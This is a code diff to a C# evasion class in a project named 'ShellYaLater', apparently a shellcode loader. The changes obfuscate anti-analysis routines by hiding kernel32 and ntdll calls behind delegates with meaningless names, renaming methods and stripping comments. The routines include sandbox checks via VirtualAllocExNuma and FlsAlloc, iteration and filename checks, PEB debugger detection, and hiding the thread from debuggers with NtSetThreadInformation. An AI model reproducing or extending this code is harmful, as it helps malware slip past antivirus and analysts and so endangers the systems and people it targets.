@@ -15,10 +15,12 @@ namespace ShellYaLater.Evasion_Class
     {
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
+        
 
         [DllImport("kernel32.dll")]
         static extern IntPtr GetCurrentProcess();
-
+        private delegate IntPtr TRY1();
+        private static TRY1 OOPS;
         public static void SleepTimer()
         {
             DateTime t1 = DateTime.Now;
@@ -30,14 +32,16 @@ namespace ShellYaLater.Evasion_Class
             }
         }
 
-        //allocExNuma
+        
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-
-        public static void VirtualAllocExNuma()
+        private delegate IntPtr VAT(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+        private static VAT VIT;
+        public static void VAE()
         {
-
-            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            VIT = VirtualAllocExNuma;
+            OOPS = GetCurrentProcess;
+            IntPtr mem = VIT(OOPS(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
             if (mem == null)
             {
                 return;
@@ -45,19 +49,21 @@ namespace ShellYaLater.Evasion_Class
         }
 
 
-        //flsalloc
+        
         [DllImport("kernel32.dll")]
         static extern IntPtr FlsAlloc(IntPtr lpCallback);
-        public static void FlsAlloc()
+        private delegate IntPtr FIZZ(IntPtr lpCallback);
+        private static FIZZ FUZZ;
+        public static void FA()
         {
-
-            IntPtr result = FlsAlloc(IntPtr.Zero);
+            FUZZ = FlsAlloc;
+            IntPtr result = FUZZ(IntPtr.Zero);
             if (result == null)
             {
                 return;
             }
         }
-        //iterations
+        
         public static void ManyIterations()
         {
             int count = 0;
@@ -71,7 +77,7 @@ namespace ShellYaLater.Evasion_Class
                 return;
             }
         }
-        //file name check
+        
         public static void FilenameCheck()
         {
             string exename = "ShellYaLater";
@@ -81,7 +87,7 @@ namespace ShellYaLater.Evasion_Class
             }
         }
 
-        //check for AV debugger --> check if the parent process makes sense (eg. explorer)
+        
         [StructLayout(LayoutKind.Sequential)]
         internal struct PROCESS_BASIC_INFORMATION
         {
@@ -101,14 +107,14 @@ namespace ShellYaLater.Evasion_Class
         {
             const int ProcessBasicInformation = 0;
 
-            // Get a handle to the current process
+            
             IntPtr currentProcess = Process.GetCurrentProcess().Handle;
 
-            // Set up the structure and variables
+            
             PROCESS_BASIC_INFORMATION procInfo = new PROCESS_BASIC_INFORMATION();
             uint retLength = 0;
 
-            // Call ZwQueryInformationProcess
+            
             int status = ZwQueryInformationProcess(
                 currentProcess,
                 ProcessBasicInformation,
@@ -117,9 +123,9 @@ namespace ShellYaLater.Evasion_Class
                 ref retLength
             );
 
-            if (status != 0) // STATUS_SUCCESS is 00
+            if (status != 0) 
             {
-                // Retrieve and return the parent process ID
+                
                 return;            
             }
             if (Marshal.ReadByte(procInfo.PebAddress, 2) != 0)
@@ -130,28 +136,36 @@ namespace ShellYaLater.Evasion_Class
             
             
         }
-        //function check if the debugger is present 
-
-        //antidebug thread
+        
 
         [DllImport("kernel32.dll")]
         private static extern IntPtr GetCurrentThreadId();
 
+        private delegate IntPtr GCI();
+        private static GCI IGC;
+
         [DllImport("kernel32.dll")]
         private static extern void ExitProcess(uint uExitCode);
+
+        private delegate void PE(uint uExitCode);
+        private static PE TREE;
 
         [DllImport("ntdll.dll")]
         private static extern int NtSetThreadInformation(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadPriority, long ThreadLength);
 
-        public static void NtSetThreadInformation()
+        private delegate int NSTI(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadPriority, long ThreadLength);
+        private static NSTI TRUST;
+        public static void NSTT()
         {
-            
-            IntPtr ThreadHandle = GetCurrentThreadId();
-            int status = NtSetThreadInformation(ThreadHandle, 0x11, IntPtr.Zero, 0);
+            IGC = GetCurrentThreadId;
+            TREE = ExitProcess;
+            TRUST = NtSetThreadInformation;
+            IntPtr ThreadHandle = IGC();
+            int status = TRUST(ThreadHandle, 0x11, IntPtr.Zero, 0);
             
             if (status != 0)
             {
-                ExitProcess((uint)status);
+                TREE((uint)status);
             }
         }
 
